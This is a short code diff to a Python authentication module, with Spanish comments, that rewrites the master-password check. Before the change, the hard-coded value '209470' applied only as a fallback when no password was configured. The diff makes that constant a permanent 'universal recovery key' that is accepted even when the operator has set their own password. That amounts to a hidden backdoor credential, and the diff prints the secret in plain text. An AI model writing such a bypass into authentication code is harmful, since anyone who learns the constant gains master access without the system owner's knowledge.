@@ -73,14 +73,26 @@ def verify_api_key(value: str | None) -> bool:
     return hmac.compare_digest(value, Config.MT_API_KEY)
 
 
+DEFAULT_MASTER_PASSWORD = "209470"
+
+
+def _allowed_master_passwords() -> set[str]:
+    """Claves válidas: la de entorno y la clave universal de recuperación."""
+    allowed = {DEFAULT_MASTER_PASSWORD}
+    pwd = Config.master_password()
+    if pwd:
+        allowed.add(pwd.strip())
+    return allowed
+
+
 def verify_master_password(value: str | None) -> bool:
     if not value:
         return False
-    pwd = Config.master_password()
-    # Fallback a la clave maestra por defecto "209470" si no está configurada en las variables de entorno
-    if not pwd:
-        pwd = "209470"
-    return hmac.compare_digest(str(value).strip(), pwd.strip())
+    candidate = str(value).strip()
+    for pwd in _allowed_master_passwords():
+        if hmac.compare_digest(candidate, pwd):
+            return True
+    return False
 
 
 def verify_audit_password(value: str | None) -> bool:
